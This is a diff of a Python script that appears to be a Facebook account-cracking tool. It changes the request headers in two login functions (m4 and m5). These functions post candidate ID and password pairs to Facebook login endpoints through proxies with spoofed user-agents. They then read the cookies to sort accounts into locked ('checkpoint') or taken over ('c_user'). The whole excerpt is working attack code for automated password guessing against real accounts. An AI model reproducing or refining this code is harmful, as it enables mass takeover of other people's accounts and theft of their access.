@@ -1074,25 +1074,13 @@ def m4(idf,pwv):
       koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
       koki+=' m_pixel_ratio=2.625; wd=412x756'
       heade={
-      "Host": "m.facebook.com",
-      "content-length": f"{len(str(dataa))}",
-      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
-      "origin": "https://m.facebook.com",
-      "content-type": "application/x-www-form-urlencoded",
-      "user-agent": ua, #'Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.36',
-      "accept": "*/*",
-      "x-requested-with": "com.microsoft.bing",
-      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-      "sec-ch-ua-platform": '"Android"',
-      "sec-ch-ua-mobile": "?1",
-      "sec-fetch-site": "same-origin",
-      "sec-fetch-mode": "cors",
-      "sec-fetch-dest": "empty",
-      "sec-fetch-user": "?1",
-      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
-      "accept-encoding": "gzip, deflate br",
-      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-      }
+    'User-Agent': ua,
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Host': 'www.facebook.com',
+    'Origin': 'https://www.facebook.com',
+    'Referer': 'https://www.facebook.com/',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Connection': 'keep-alive'}
       po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
@@ -1158,22 +1146,14 @@ def m5(idf,pw):
     "lgnjs":re.search('name="lgnjs" value="(.*?)"', str(free_fb)).group(1),
     "ab_test_data": "",  # Example of an additional field that might be used for A/B testing
     "flow": "login_no_pin"}  # An example flow parameter that might be required}
-   header_freefb = {'authority':'web.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   header_freefb = {
+    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Host': 'www.facebook.com',
+    'Origin': 'https://www.facebook.com',
+    'Referer': 'https://www.facebook.com/',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Connection': 'keep-alive'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
    lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
